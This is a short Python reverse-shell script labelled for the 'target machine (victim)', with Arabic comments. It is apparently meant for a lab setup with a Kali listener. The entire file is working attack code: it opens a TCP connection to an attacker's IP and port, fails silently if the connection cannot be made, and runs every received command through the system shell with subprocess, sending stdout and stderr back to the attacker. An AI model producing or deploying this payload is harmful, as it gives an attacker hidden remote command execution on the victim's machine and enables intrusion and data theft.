# Shell.py - Target Machine (Victim)
import socket
import subprocess
import os

# -- إعدادات الاتصال --
ATTACKER_HOST = '192.168.100.15' # غيّر هذا إلى عنوان IP الخاص بجهاز كالي
ATTACKER_PORT = 4444        # يجب أن يتطابق مع منفذ المستمع

# إنشاء سوكيت TCP/IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# محاولة الاتصال بالمستمع
try:
    s.connect((ATTACKER_HOST, ATTACKER_PORT))
except Exception as e:
    # في حالة فشل الاتصال، أغلق البرنامج بصمت
    exit()

# حلقة لا نهائية لاستقبال الأوامر وتنفيذها
while True:
    try:
        # استقبال الأمر من المهاجم
        command = s.recv(1024).decode('utf-8')

        if command.lower() == 'exit':
            break
            
        # تنفيذ الأمر
        # ملاحظة: هذا التنفيذ بسيط جدًا وقد لا يعمل مع كل الأوامر التفاعلية
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        # إرسال الناتج (stdout + stderr) مرة أخرى إلى المهاجم
        result = output.stdout + output.stderr
        s.send(result.encode('utf-8', 'ignore'))

    except Exception as e:
        # في حالة حدوث خطأ، أرسل رسالة الخطأ للمهاجم
        error_msg = str(e)
        s.send(error_msg.encode('utf-8', 'ignore'))

# إغلاق الاتصال
s.close()
